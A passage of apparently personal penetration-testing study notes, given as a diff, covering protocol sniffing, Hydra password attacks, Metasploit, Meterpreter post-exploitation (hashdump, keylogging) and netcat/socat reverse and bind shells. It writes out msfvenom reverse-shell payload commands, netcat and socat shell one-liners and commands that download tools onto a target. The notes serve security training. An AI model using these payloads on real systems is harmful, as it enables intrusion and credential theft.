+                        The change will be saved on the IMAP server (MDA) and replicated on your laptop
+
+                telnet <target> 143
+                    <random> LOGIN <username> <password>
+                    <random> LIST "" "*"
+                    <random> EXAMINE INBOX
+
+                Sends login credentials in cleartext
+
+
+        Servers with Telnet, HTTP, FTP, SMTP, POP3 or IMAP protocols are subject to different kinds of attacks
+
+            To name a few
+                Sniffing Attack (Network Packet Capture)
+                Man-in-the-Middle (MITM) Attack
+                Password Attack (Authentication Attack)
+                Vulnerabilities
+                ...
+
+            CIA     Confidentiality Integrity Availability
+            DAD     Disclosure Alteration Destruction
+
+
+        Sniffing Attack
+
+            Using a network packet tool to collect information about the target
+                When a protocol communicates in cleartext, the data exchanged can be captured by a third party to analyse
+
+            A sniffing attack can be conducted using an Ethernet (802.3) network card
+                Provided that the user has proper permissions (root permissions or administrator privileges)
+
+                    Tcpdump         Free open source CLI
+
+                        sudo tcpdump port 110 -A
+
+                                -A      Display the contents of the captured packets in ASCII
+
+                            This attack requires access to the network traffic
+                                For example, via a wiretap or a switch with port mirroring
+                                Alternatively, we can access the traffic exchanged if we launch a successful MITM attack
+
+
+                    Wireshark       Free open source GUI
+                    Tshark          CLI alternative to Wireshark
+
+
+        Man-in-the-Middle Attack
+
+            When a protocol does not provide secure authentication or integrity checking
+
+            Tools
+                Ettercap
+                Bettercap
+
+            The solution lies in proper authentication along with encryption or signing of the exchanged messages
+                Public Key Infrastructure (PKI) and trusted root certificates
+                Transport Layer Security (TLS)
+
+
+        Transport Layer Security (has practically replaced Secure Sockets Layer)
+
+            A standard solution to protect the confidentiality and integrity of the exchanged packets
+
+                TLS (or SSL) are in Presentation Layer 6
+
+            An existing cleartext protocol can be upgraded to use encryption via SSL/TLS
+
+                Protocol    Default Port    Secured Protocol    With TLS
+
+                HTTP        80              HTTPS               443
+                FTP         21              FTPS                990
+                SMTP        25              SMTPS               465
+                POP3        110             POP3S               995
+                IMAP        143             IMAPS               993
+                ...
+
+            HTTPS requires at least the following three steps
+
+                1. Establish a TCP connection
+                2. Establish SSL/TLS connection
+
+                    SSL Handshake
+
+                    Client                  Server                  Comment
+
+                    ClientHello         -->                         To indicate its capabilities, such as supported algorithms
+
+                                            ServerHello             Indicating the selected connection parameters
+                                            Certificate*            If server authentication is required
+                                            ServerKeyExchange*      Might send information to generate the master key
+                                            CertificateRequest*
+                                        <-- ServerHelloDone
+
+                    Certificate*
+                    ClientKeyExchange*                              Contains information to generate the master key
+                    CertificateVerify*
+                    [ChangeCipherSpec]                              It switches to use encryption and informs the server in the message
+                    Finished            -->
+
+                                            [ChangeCipherSpec]      Switches to use encryption as well and informs the client
+                                        <-- Finished
+
+                3. Send HTTP requests to the webserver
+
+
+        Secure Shell (SSH)
+
+            On Linux, macOS, and MS Windows builds after 2018
+
+                ssh <username>@<address>
+                    If it is the first time we connect
+                        We will need to confirm the fingerprint of the SSH server's public key to avoid man-in-the-middle attacks
+                            In the case of SSH, we don't usually have a third party to check if the public key is valid
+
+            Secure way for remote system administration
+                Connect to another system over the network
+                Execute commands on the remote system
+
+            Ensured by cryptography
+                1. You can confirm the identity of the remote server
+                2. Exchanged messages are encrypted and can only be decrypted by the intented recipient
+                3. Both sides can detect any modification in the messages
+
+            The SSH server listens on port 22 by default
+            The SSH client can authenticate using a username and a password, or a private and public key
+
+            Very reliable
+                Username and password are sent encrypted
+                All commands we execute on the remote system will be sent over an encrypted channel
+
+            SSH to transfer files using SCP (Secure Copy Protocol)
+                scp <username>@<address>:<path/file.ext> ~
+                    From the remote system to the root of our home directory
+                scp file.ext <username>@<address>:<path>
+                    From the local system to the specified directory on the remote system
+
+            SSH can also be used to secure FTP, which is the SFTP protocol (port 22, just like SSH)
+                FTP could be secured using SSL/TLS by using the FTPS protocol (port 990)
+
+
+        Password Attack
+
+            1. Password Guessing
+            2. Dictionary Attack
+            3. Brute Force Attack
+
+            Authentication is providing who you claim to be
+                Something you
+                    know            password, PIN (Personal Identification Number)
+                    have            SIM card, RFID card, USB dongle
+                    are             fingerprint, iris
+
+
+            Dictionary Attack from Kali
+
+                find / -name *rockyou* 2>/dev/null
+
+                hydra -l <username> -P <wordlist> <server> <service>
+
+                    -s PORT     To specify a non-default port
+                    -V or -vV   Verbosity
+                    -t n        Where n is the number of parallel connections to the targets
+                    -t 16       Will create 16 threads used to connect to the target
+                    -d          Debugging
+
+                Verbosity or debugging can be pretty helpful if you want Hydra to update you about its progress
+                Once the password is found, you can issue Ctrl + C to end the process
+
+            Mitigation against such attacks
+                Password Policy (enforces minimum complexity)
+                Account Lockout (after a certain number of failed attempts)
+                Throttling Authentication Attempts (delays the response)
+                Using CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart)
+                Requiring the use of a public certificate (works well with SSH)
+                Two-Factor Authentication (code available via other means)
+                IP-based geolocation
+                ...
+
+
+        Default port number for common protocols
+
+            FTP     21      File Transfer                       Cleartext
+            FTPS    990     File Transfer                       Encrypted
+            HTTP    80      Worldwide Web                       Cleartext
+            HTTPS   443     Worldwide Web                       Encrypted
+            IMAP    143     Email (MDA)                         Cleartext
+            IMAPS   993     Email (MDA)                         Encrypted
+            POP3    110     Email (MDA)                         Cleartext
+            POP3S   995     Email (MDA)                         Encrypted
+            SFTP    22      File Transfer                       Encrypted
+            SSH     22      Remote Access and File Transfer     Encrypted
+            SMTP    25      Email (MDA)                         Cleartext
+            SMTPS   465     Email (MDA)                         Encrypted
+            Telnet  23      Remote Access                       Cleartext
+
+
+
+Vulnerability Research
+
+    Vulnerability 101
+
+        An enormous part of penetration testing is knowing the skills and resources for whatever situation you face
+
+
+        Five main categories of vulnerabilities
+
+            Operating System                Often result in privilege Escalation
+            (Mis)Configuration-based        For example, a website exposing customer details
+            Weak or Default Credentials     Easy to guess by an attacker
+            Application Logic               May result in an attacker being able to impersonate a user
+            Human-Factor                    For example, phishing emails designed to trick humans
+
+
+        Scoring Vulnerabilities
+
+            Vulnerability management is the process of evaluating, categorising and ultimately remediating threats
+            It is arguably impossible to patch and remedy every single vulnerability
+            This is where vulnerability scoring comes into play
+
+                CVSS (Common Vulnerability Scoring System)
+                    Awards points based upon its features, availability, and reproducibility
+
+                VPR (Vulnerability Priority Rating)
+                    Heavy focus on the risk a vulnerability poses to the organisation itself
+
+
+        Vulnerability Databases
+
+            Fundamental key terms
+
+                Vulnerability           Weakness or flaw in the design, implementation or behaviours of a system or application
+                Exploit                 An action or behaviour that utilises a vulnerability on a system or application
+                Proof of Concept        Tool that often demonstrates the exploitation of a vulnerability
+
+            NVD (National Vulnerability Database)
+
+                CVE (Common Vulnerabilities and Exposures)
+                    CVEs have the formatting of CVE-YEAR-IDNUMBER
+
+            Exploit-DB by OffSec
+
+                Retains exploits stored under the name, author and version of the software or application
+                    Snippets of code (known as PoC) that are used to exploit a specific vulnerability
+
+
+        Finding a Vulnerability
+
+            Throughout an assessment, you will often combine multiple vulnerabilities to get results
+
+            Example
+                1. Leverage the "Version Disclosure" vulnerability
+                2. With this version, use Exploit-DB to search for any exploits
+
+
+        Showcase
+
+            1. Scope
+                IP address
+            2. Information Gathering
+                Details about the target company
+            3. Enumeration & Scanning
+                Services and applications running on company's infrastructure
+                    What services may be viable to attack
+            4. Application Testing
+                Version number noticed
+            5. Vulnerability Research
+                Visit of a vulnerablility & exploit database
+            6. Exploitation
+
+
+    Exploit Vulnerabilities
+
+        Automated Vs. Manual Vulnerability Research
+
+            Automated
+
+                For example, the vulnerability scanner Nessus has both a free (community) edition and commercial
+
+                Frameworks such as Metasploit often have vulnerability scanners for some modules
+
+                Advantage                       Disadvantage
+
+                Easy to repeat                  Dependence
+                Test numerous apps quickly      Loud
+                Open-source solutions exists    Often basic and requires licenses to have useful features
+                Cover a wide range              Often do not find every vulnerability
+
+            Manual
+
+                Often the weapon of choice when testing individual applications or programs
+
+            Both techniques involve testing for
+
+                Security Misconfigurations
+                Broken Access Control
+                Insecure Deserialization
+                Injection
+                ...
+
+
+        Finding Manual Exploits
+
+            Rapid7 is a vulnerability research database that also acts as an exploit database
+
+            Security researchers store & share PoCs on GitHub, tagging and keyword: "cve", "Poc", "vulnerability", etc.
+
+            Searchsploit tool available on Kali is an offline copy of Exploit-DB, containing copies of exploits
+
+
+        Example of Manual Exploitation
+
+            Remote Code Execution
+                One of the most effective vulnerabilities
+
+            A foothold is an access to the vulnerable machine's console
+                Where we can then begin to exploit other applications or machines on the network
+
+            Exploits rarely come out of the box and ready to be used
+                They often require some configuration before they will work for our environment or target
+
+
+
+Metasploit
+
+    Introduction
+
+        The most widely used exploitation framework
+        Can support all phases of a penetration testing engagement
+            From information gathering to post-exploitation
+
+        Metasploit Pro has a GUI
+        Metasploit Framework has an open-source CLI
+
+        msfconsole              The main CLI
+        Modules                 Exploits, scanners, payloads, etc.
+        Tools (Stand-alone)     msfvenom, pattern_create, pattern_offset, etc.
+
+
+        Recurring concepts
+
+            Vulnerability
+                A design, coding, or logic flaw affecting the target system
+
+            Codes that run on the target system
+                Exploit
+                    A piece of code that uses a vulnerability present on the target system
+                    Exploits will leverage a vulnerability
+                Payload
+                    An exploit will take advantage of a vulnerability
+                    Payloads are the code that run on the target system
+                    Payloads to achieve the desired result
+
+
+        Main Components of Metasploit
+
+            Auxiliary
+                Any supporting module, such as scanners, crawlers and fuzzers, can be found here
+
+            Encoders
+                Allow you to encode the exploit and payload
+                    In the hope that a signature-based antivirus solution may miss them
+
+            Evasion
+                Encoders should not be considered a direct attempt to evade antivirus software
+                    Evasion modules will try that
+
+            Exploits
+                Neatly organized by target system
+
+            NOPs
+                No OPeration
+                    Do nothing, literally
+                    They are often used as a buffer to achieve consistent payload sizes
+
+            Payloads
+                Four different directories
+
+                    Adapters
+                        Wraps single payloads to convert them into different formats
+                            For example inside a Powershell adapter
+                                Which will make a single powershell command that will execute the payload
+
+                    Singles
+                        Self-contained payloads (add user, launch notepad.exe, etc.)
+                            Do not need to download an additional component to run
+
+                    Stagers
+                        Responsible for setting up a connection channel between Metasploit and the target system
+                            "Staged payloads" will first upload a stager system
+                            Then download the rest of the payload (stage)
+                                The initial size will be relatively small compared to the full payload sent at once
+
+                    Stages
+                        Downloaded by the stager, this will allow you to use larger sized payloads
+
+                Identify single (also called "inline") payloads and staged payloads
+                    Inline "_" generic/shell_reverse_tcp
+                    Staged "/" windows/x64/shell/reverse_tcp
+
+                Metasploit offers the ability to send different payloads that can open shells on the target system
+
+
+            Post
+                Post-exploitation modules
+
+
+        msfconsole
+
+            Once launched, you will see the command line changes to msf6
+                Can be used just like a regular command-line shell
+                Does not support output redirection and other features
+                Supports tab completion
+
+                    msf6 > ping -c 1 8.8.8.8                Ping sent to Google's DNS IP address
+
+                    msf6 > help <msf6Command>
+
+                    msf6 > help search
+
+                    msf6 > clear
+
+                    msf6 > history
+
+
+            Managed by context
+
+                Unless set as a global variable
+                    All parameter settings will be lost if you change the module you have decided to use
+
+                msf6 > use exploit/windows/smb/ms17_010_eternalblue
+
+                    Use the MS17-010 "Eternalblue" exploit for illustration puposes
+                        Allegedly developed by the U.S. National Security Agency
+                        Leaked by the cybercriminal group Shadow Brokers in April 2017
+                        Exploited worldwide in the WannaCry ransomware attack in May 2017
+                        Vulnerability affecting the SMBv1 server on numerous Windows systems
+                            Server Messsage Block is widely used in Windows networks (file sharing, files to printers)
+
+                    The command line prompt change
+                        msf6 exploit(windows/smb/ms17_010_eternalblue) > ls
+                            We did not "enter" a folder as you would typically expect in an operating system command line
+                        msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+                            The prompt tells us we now have a context set in which we will work
+                            The show options commande will have different outputs depending on the context it is used
+
+                    The show command can be used in any context followed by a module type (auxiliary, payload, exploit, etc.)
+                        msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
+                            Lists payloads that can be used with the MS17-010 Eternalblue exploit
+                                Used from the main msfconsole prompt the show command will list all
+
+                    Further information on any module can be obtained
+                        msf6 exploit(windows/smb/ms17_010_eternalblue) > info
+                            Alternatively
+                                msf6 > info <modulePath>
+
+                    You can leave the context
+                        msf6 exploit(windows/smb/ms17_010_eternalblue) > back
+
+
+            Search the Metasploit Framework database for modules relevant to the given search parameter
+
+                msf6 > search <cveNumber|exploitName|targetSystem>
+
+                    You can use any module by his number at the beginning of the result line
+
+                    Name column
+
+                        Type of module (auxiliary, exploit, etc.)
+                        Category of the module (scanner, admin, Windows, Unix, etc.)
+
+                    Rank column
+
+                        Excellent   The exploit will never crash the service (this is the case for SQLi, CMD execution, RFI, LFI, etc.)
+                                    No typical memory corruption exploits should be given this ranking unless there are extraordinary circumstances
+
+                        Great       The exploit has a default target
+                                    AND either auto-detects the appropriate target or uses an application-specific return address
+                                    AFTER a version check
+
+                        Good        The exploit has a default target
+                        Normal      The exploit is otherwise reliable
+                                    BUT depends on a specific version and can't (or doesn't) reliably autodetect
+
+                        Average     Generally unreliable or difficult to exploit
+                        Low         Nearly impossible to exploit (or under 50% succes rate) for common platforms
+                        Manual      Unstable or difficult to exploit and is basically a DoS
+
+
+            You can direct the search function using keywords such as type and platform
+
+                msf6 > search type:auxiliary telnet
+
+
+        Working with modules
+
+            Metasploit command prompt
+
+                msf6 >
+
+            Context command prompt
+
+                msf6 <context> >
+
+                    Once you have entered the context of a module, you will need to set parameters
+
+                        show payloads
+
+                        show options                        List the required parameters
+
+                        set <parameter> <value>
+
+                        unset <parameter>
+
+                        unset all
+
+                        setg <parameter> <value>            Global (for all modules)
+
+                        unsetg all
+
+
+                    Parameters you will often use
+
+                        RHOSTS      Remote host(s)
+                                        IP address or network range
+                                        A .txt file where targets are listed, one per line
+
+                        RPORT       Remote port
+
+                        PAYLOAD
+
+                        LHOST       Local host
+
+                        LPORT       Local port to use for the reverse shell
+
+                        SESSION     Each connection to the target using Metasploit will have a session ID
+                                        With post-exploitation modules (using an existing connection)
+
+
+                    Once all parameters are set, you can launch the module using
+
+                        run             Alias for the exploit command
+                        exploit
+                        exploit -z      Run and background the session as soon as it opens
+
+
+            Meterpreter command prompt
+
+                meterpreter >                       Session (once a vulnerability has been successfully exploited)
+                meterpreter > background            Background the session and go back to the msf6 <context> prompt
+                msf6 <context> > sessions           To see the existing sessions
+                msf6 <context> > sessions -i <id>   To interact with a session
+
+
+    Metasploit Exploitation
+
+        Scanning
+
+            Port Scanning
+
+                msf6 > search portscan
+
+                msf6 > use <id>
+
+                msf6 <context> > show options
+
+                    CONCURRENCY     Number of targets to be scanned simultaneously
+                    PORTS           Port range like 1-1000, unlike Nmap (1000 most used ports) it's 1 to 1000
+                    RHOSTS          Target or target network
+                    THREADS         Threads that can be used simultaneously
+
+                msf6 > nmap -sS <target(s)>
+
+                    You can directly perform Nmap scans from the msfconsole
+
+
+            UDP Service Identification
+
+                msf6 > search udp_sweep
+
+                    Provides a quick way to identify services running over UDP such as DNS or NetBIOS
+
+
+            SMB Scans
+
+                Useful auxiliary modules in a corporate network
+
+                    smb_enumshares and smb_version
+
+
+        The Metasploit Database
+
+            Penetration testing engagement will likely have several targets
+            Metasploit has a database function to simplify project management and avoid possible confusion
+
+            1. Execute a shell as root
+            2. systemctl start postgresql           Start the PostgreSQL database
+            3. msfdb init                           Initialize the Metasploit Database
+            4. msfconsole                           Launch Metasploit
+
+                msf6 >
+
+                    db_status
+
+                    workspace                           Current workspace flagged by a * symbol
+                    workspace -a <name>                 Add a workspace, to isolate different projects
+                    workspace <name>                    Move to the <name> workspace
+                    workspace -h                        List commands
+
+                    help                                Show the Database Backends Commands, among others
+
+
+                    db_nmap [parameters] <target(s)>    Run Nmap, all results will be saved to the database
+
+                        You can now reach information relevant to hosts and services running on target systems
+
+                            hosts
+                            hosts -h
+                            hosts -R                    Set RHOSTS from the results of the search
+                            services
+                            services -S <name>          Search for specific services in the environment
+
+                                search ...
+                                use ...
+                                show options
+
+                                run
+
+                        If there is more than one host saved to the database, all IP addresses will be used
+
+                        In a typical penetration testing engagement
+                            Finding available hosts using db_nmap command
+                            Scanning this for further vulnerabilities or open ports (using a port scanning module)
+
+
+        Vulnerability Scanning
+
+            The term "low hanging fruit" usually refers to easily identifiable and exploitable vulnerabilities
+                That could potentially allow you to gain a foothold on a system
+
+            Finding vulnerabilities will rely heavily on your ability to scan and fingerprint the target
+                The better you are at these stages, the more options Metasploit may provide you
+
+
+        Exploitation
+
+            Payloads
+
+                Most of the exploits will have a preset default payload
+
+                    msf6 > search type:exploit shellshock
+                    msf6 > use 1
+                    msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show payloads
+                    msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set payload <id>
+
+                Some payloads will open new parameters that you may need to set
+
+                    msf6 <context> > show options
+
+
+            Sessions
+
+                Once you get a shell
+                    Backgrounding a session will be useful when working on more than one target simultaneously
+                        Or on the same target with a different exploit and/or shell
+
+                            Ctrl + Z                Background the session
+
+                            session                 List all active sessions
+                            session -h
+
+
+        Msfvenom
+
+            Replaced Msfpayload and Msfencode
+
+            Allows you to access all payloads available in the Metasploit framework
+
+                msfvenom -l payloads
+
+
+            Allows you to create payloads
+                In many different formats (PHP, exe, dll, elf, etc.)
+                For different targets systems (Apple, Windows, Android, Linux, etc.)
+
+            Output formats
+
+                msfvenom --list formats
+
+                    You can either generate
+                        Stand-alone payloads (for example a Windows executable for Meterpreter)
+                        Usable raw format (for example Python)
+
+
+            Encoders
+
+                Do not aim to bypass antivirus installed on the target system
+                    It can be effective against some antivirus software
+                    Using modern obfuscation techniques or learning methods to inject shellcode is a better solution
+
+                Encode the payload
+
+                    msfvenom -p php/meterpreter/reverse_tcp <lhost> <rhost> -f raw -e php/base64
+
+
+            Handlers
+
+                Similar to exploits using a reverse shell
+                    You will need to be able to accept incoming connections generated by the Msfvenom payload
+                        When using an exploit module, this part is automatically handled by the exploit module
+                        The term commonly used to receive a connection from a target is "catching a shell"
+
+                Reverse shells or Meterpreter callbacks generated in your Msfvenom payload can be easily caught using a handler
+
+
+                Example scenario for exploiting the file upload vulnerability in DVWA (Damn Vulnerable Web Application)
+
+                    1. Generate the PHP shell using Msfvenom
+                    2. Start the Metasploit handler
+                    3. Execute the PHP shell
+
+                    msfvenom -p php/reverse_php LHOST=<lhost> LPORT=<lport> -f raw > rev_shell.php
+
+                        The PHP file should be edited (starting PHP tag commented, missing end tag)
+
+
+                    msf6 > use exploit/multi/handler
+
+                        Multi Handler to receive the incoming connection
+                            Supports all Metasploit payloads and can be used for Meterpreter as well as regular shells
+
+                        msf6 exploit(multi/handler) > search type:payload php reverse
+
+                        msf6 exploit(multi/handler) > set payload php/reverse_php
+
+                        msf6 exploit(multi/handler) > show options
+
+                        msf6 exploit(multi/handler) > set ...
+
+                        msf6 exploit(multi/handler) > run
+
+                            When the reverse shell is triggered, the connection will be received and provide us a shell
+                            If the payload was set as Meterpreter, multi/handler would then provide us with a Meterpreter shell
+
+
+            Other payloads
+
+                Based on the target system's configuration, Msfvenom can be used to create payloads in almost all formats
+
+
+                Linux Executable and Linkable Format (.elf format is comparable to the .exe format in Windows)
+
+                    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf > rev_shell.elf
+
+                        You may still need to make sure they have executable permissions on the target machine
+                            Once you have the rev_shell.elf on your target machine
+                                chmod +x rev_shell.elf
+                            Once done, on the target machine command line
+                                ./rev_shell.elf
+
+                Windows
+                    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe > rev_shell.exe
+
+                PHP
+                    msfvenom -p php/meterpreter_reverse_tcp LHOST=<lhost> LPORT=<lport> -f raw > rev_shell.php
+
+                ASP
+                    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f asp > rev_shell.asp
+
+                Python
+                    msfvenom -p cmd/unix/reverse_python LHOST=<lhost> LPORT=<lport> -f raw > rev_shell.py
+
+
+                All of the examples above are reverse payloads
+                    You will need to have the exploit/multi/handler module listening on your attacking machine
+                    You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters
+                        These values will be the same you have used when creating the Msfvenom payload
+
+
+    Metasploit Meterpreter
+
+        Introduction
+
+            A Metasploit payload that supports the penetration testing process with many valuable components
+            Will run on the target system and act as an agent within a command and control architecture
+            You will interact with the target OS and files and use Meterpreter's specialized commands
+
+            Runs on the target but is not installed
+                Runs in memory (Random Access Memory) and does not write itself to the disk on the target
+                This way, Meterpreter will be seen as a process and not have a file on the target system
+                    Aims to avoid being detected during antivirus scans (new files on the disk)
+
+            Will establish an encrypted (TLS) communication channel with the attacker's system
+                Aims to avoid being detected by network-based IPS and IDS solutions
+                If the target organization does not inspect and decrypt encrypted traffic
+
+                    Meterpreter is recognized by major antivirus software
+
+
+            meterpreter > getpid
+
+                Returns the process ID with which Meterpreter is running
+                    All processes running in Linux or Windows will have a unique ID number
+                    Used to interact with the process when the need arises
+                        If it needs to be stopped for example
+
+
+            meterpreter > ps
+
+                List processes running on the target
+                    Meterpreter's PID could be associated with spoolsv.exe (Microsoft)
+                        And not meterpreter.exe, as on might expect
+
+
+            C:\Windows\system32>tasklist /m /fi "pid eq <pid>"
+
+                Even if we where to go a step further and look at DLLs (Dynamic-Link Libraries) used by the Meterpreter process
+                    We still would not find anything jumping at us (no meterpreter.dll for example)
+
+
+        Meterpreter Flawors
+
+            Metasploit payloads can be initially divided into two categories
+
+                Inline
+                    Also called single
+
+                Staged payloads
+                    Sent to the target in two steps
+                        An initial part is installed (the stager)
+                        And requests the rest of the payload
+                            Allows for a smaller initial payload size
+
+
+            Meterpreter payloads are also divided into stagged and inline versions
+
+
+            msfvenom --list payloads | grep meterpreter
+
+                Will show versions available (Android, iOS, Java, Linux, OSX, PHP, Python, Windows)
+
+                Your decision on which version to use will be mostly based on three factors
+                    The target operating system
+                    Components available on the target system
+                        Is Python installed?
+                        Is this a PHP website?
+                        ...
+                    Network connection types you can have with the target system
+                        Do they allow raw TCP connections?
+                        Can you only have an HTTPS reverse connection?
+                        Are IPv6 addresses not as closely monitored as IPv4 addresses?
+                        ...
+                If you are not using Meterpreter as a standalone payload generated by Msfvenom
+                    Your choice may also be limited by the exploit
+                        Some exploits will have a default Meterpreter payload
+                        You can list other available payloads using the "show payloads" command with any module
+
+
+        Meterpreter Commands
+
+            They will run on the target system without loading any additional script or executable files
+
+            Meterpreter will provide you with three primary categories of tools
+                Built-in commands
+                Meterpreter tools
+                Meterpreter scripting
+
+            Every version of Meterpreter will have different command options
+
+                meterpreter > help
+
+                    Categories (results with windows/x64/meterpreter/reverse_tcp)
+                        Core commands
+                        File system commands
+                        Networking commands
+                        System commands
+                        User interface commands
+                        Webcam commands
+                        Audio output commands
+                        Elevate commands
+                        Password database commands
+                        Timestomp commands
+
+
+        Post-Exploitation with Meterpreter
+
+            meterpreter > help
+
+                Will help you quicky browse through available commands once you have a Meterpreter session
+
+
+            meterpreter > getuid
+
+                Will display the user with which Meterpreter is currently running
+                    This will give you an idea of your possible privilege level on the target system
+                    Are you an admin level user like NT AUTHORITY\SYSTEM or a regular user?
+
+
+            meterpreter > ps
+
+                List running processes (information you will need to migrate Meterpreter to another process)
+                    PID     Process ID
+                    PPID    Parent Process ID
+
+
+            meterpreter > migrate <pidOfTheDesiredTarget>
+
+                Migrating to another process will help Meterpreter to interact with it
+                    For example, if a word processor is running on the target (word.exe, notepad.exe, etc.)
+                        You can migrate to it and start capturing keystrokes sent by the user to this process
+                            Some Meterpreter versions will offer you
+                                keyscan_start
+                                keyscan_stop
+                                keyscan_dump
+
+                You may lose your user privileges if you migrate
+                    From a higher privileged user (SYSTEM for example)
+                    To a process started by a lower privileged user (like a webserver)
+
+                    You may not be able to gain them back
+
+
+            meterpreter > hashdump
+
+                Will list the content of the SAM (Security Account Manager) database
+                    Windows user passwords in the NTLM (New Technology LAN Manager) format
+
+                        While it is not mathematically possible to crack these hashes
+                            You may still discover the cleartext password
+                                Using online NTLM databases
+                                Or a rainbow table attack
+
+                        These hashes can also be used in Pass-the-Hash attacks
+
+
+            meterpreter > search -f flag.txt
+
+                Locate files (user-generated or configuration files that may contain password or account information)
+
+
+            meterpreter > shell
+
+                Will launch a regular command-line shell on the target system
+                    Ctrl + Z will help you go back to the Meterpreter shell
+
+
+        Post-Exploitation Challenge
+
+            getsystem and hashdump
+                Will provide important leverage and information for privilege escalation and lateral movement
+
+            meterpreter > load python
+                Command to leverage additional tools such as Kiwi or even the whole Python language
+                    meterpreter > python_execute "print 'that'"
+
+            meterpreter > load kiwi
+                Once any additional tool is loaded using the load command
+                    You will see new options on the help menu
+                    Running the help command after loading a module is always a good idea
+
+            The post-exploitation phase will have several goals
+                Gathering further information about the target system
+                Looking for interesting files
+                    User credentials
+                    Additional network interfaces
+                    And generally interesting information on the target system
+                Privilege escalation
+                Lateral movement
+
+
+
+Privilege Escalation
+
+    What the shell?
+
+        We can force the remote server
+            To either send us command line access to the server (a reverse shell)
+            Or to open up a port on the server which we can connect to (a bind shell)
+
+
+        Tools to receive reverse shells and to send bind shells
+
+            Netcat
+                All kinds of network interactions, including banner grabbing during enumeration
+                Used to receive reverse shells and connect to remote ports attached to bind shells
+                Netcat shells are very unstable (easy to lose) by default
+
+            Socat
+                Socat shells are usually more stable than Netcat shells, it is vastly superior to netcat
+                The syntax is more difficult
+                Rarely installed
+
+            Both Socat and Netcat have .exe versions for use on Windows
+
+            Metasploit exploit/multi/handler
+                Used to receive reverse shells
+                Provides a fully-fledged way to obtain stable shells, with a wide variety of further options
+                It's also the only way to interact with a meterpreter shell, and the easiest way to handle staged payloads
+
+            Msfvenom
+                It is shipped as a standalone tool, to generate payloads on the fly (including reverse and bind shells)
+
+            Kali
+                tree /usr/share/webshells
+                find /usr/share -name *shell* 2>/dev/null
+
+
+        Types of Shell
+
+            Reverse Shells
+
+                When the target is forced to execute code that connect back to your computer
+                    On your computer you need to set up a listener to receive the connection
+
+                Good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target
+                    The drawback is that you would need to configure your own network to accept the shell
+
+                Example
+                    On the attacking machine (listening)
+                        nc -lnvp <lport>
+                    On the target (payload)
+                        nc <lhost> <lport> -e /bin/bash
+
+            Bind Shells
+
+                When the code executed on the target is used to start a listener attached to a shell directly on the target
+                    Meaning you can connect to the port that the code has opened and obtain remote code executiion that way
+
+                May be prevented by firewalls protecting the target
+                    Has the advantage of not requiring any configuration on your own network
+
+                Example
+                    On the target (payload)
+                        nc -lnvp <rport> -e "cmd.exe"
+                    On the attacking machine (connecting)
+                        nc <rhost> <rport>
+
+            Interactive
+                PowerShell, Bash, zsh, sh or any other standard CLI are interactives shells
+                These allow you to interact with programs after executing them
+                    For example, the SSH login prompt
+
+            Non-interactive
+                You are limited to using programs which do not require user interaction in order to run properly
+                The majority of simple reverse and bind shells are non-interactive
+                    Makes further exploitation trickier
+
+
+        Netcat
+
+            The most basic tool in a pentester's toolkit when it comes to any kind of networking
+
+            Reverse Shells
+                Listening
+                    nc -lnvp <lport>
+                        -l      Listen
+                        -n      Tells Netcat to not resolve host names or use DNS
+                        -v      Verbose output
+                        -p      Indicates that the port specification will follow
+                    sudo nc -lnvp <lport>
+                        If you use a port below 1024, you will need to use sudo
+                        It's often a good idea to use a well-known port number
+                            80 HTTP, 443 HTTPS or 53 DNS
+                                This is more likely to get past outbound firewall rules on the target
+
+            Bind Shells
+                Connecting
+                    nc <rhost> <rport>
+
+
+        Netcat Shell Stabilisation
+
+            Unstable by default
+                Pressing Ctrl + Z kills the whole thing
+                They are non-interactive, and often have strange formatting errors
+                This is due to the Netcat "shells" really being processes running inside a terminal
+
+            Stabilisation of Windows reverse shells tends to be significantly harder
+
+
+            Technique 1: Python
+
+                a   python -c 'import pty;pty.spawn("/bin/bash")'
+                        Uses Python to spawn a better featured bash shell
+                        We still won't be able to use tab autocomplete or the arrow keys, and Ctrl + Z still work
+
+                b   export TERM=xterm
+                        This will give us access to term commands such as "clear"
+
+                c   Ctrl + Z
+                        Background the shell
+
+                    stty raw -echo; fg
+
+                        First, it turns off our own terminal echo
+                            Wich gives us access to tab autocompletes, arrow keys, Ctrl + C to kill processes
+
+                        It then foregrounds the shell, thus completing the process
+
+                        If the shell dies
+                            Any input in your own terminal will not be visible
+                                As a result of having disabled terminal echo
+                                To fix this, type "reset" and press enter
+
+
+            Technique 2: rlwrap
+
+                sudo apt install rlwrap
+                rlwrap nc -lnvp <lport>
+                    Gives us access to history
+                    Tab autocompletion and the arrow keys immediately upon receiving shell
+
+                    Manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell
+
+                This technique is particulary useful when dealing with Windows shells
+                    When dealing with a Linux target, it's possible to apply Technique 1.c
+
+
+            Technique 3: Socat
+
+                Limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell
+
+                Uses an initial Netcat shell as a stepping stone into a more fully-featured socat shell
+
+                    We would first transfer a socat static compiled binary up to the target machine
+                        A version of the program compiled to have no depencies
+                            github.com/andrew-d/static-binaries
+
+                    On the attacking machine inside the directory containing your socat binary
+                        sudo python3 -m http.server 80
+
+                    On the target machine, using the Netcat shell to download the file
+                        wget <lhost>/socat -O /tmp/socat
+
+                            For the sake of completeness, in a Windows CLI
+                                Invoke-WebRequest -uri <lhost>/socat.exe -outfile C:\\Windows\temp\socat.exe
+
+
+        Socat
+
+            All socat does is provide a link between two points
+
+
+            Reverse Shells
+
+                socat TCP-L:<lport> -
+
+                    As always with socat, this is taking two points
+                        (a listening port, and standard input) and connecting them together
+
+                    The resulting shell is unstable, but this will work on either Linux or Windows
+                        and is equivalent to nc -lnvp <lport>
+
+                On Windows to connect back
+                    "pipes" to force PowerShell (or cmd.exe) to use Unix style standard input and output
+
+                    socat TCP:<lhost>:<lport> EXEC:powershell.exe,pipes
+
+                The equivalent for a Linux target
+
